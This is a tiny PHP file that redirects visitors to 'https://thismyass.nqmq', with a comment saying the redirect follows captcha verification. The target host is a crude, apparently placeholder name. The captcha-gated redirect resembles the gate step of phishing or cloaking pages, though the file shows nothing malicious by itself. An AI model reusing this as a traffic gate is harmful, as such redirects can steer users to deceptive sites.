<?php
header("Location: https://thismyass.nqmq"); // Redirect if captcha is already verified
exit();
?>
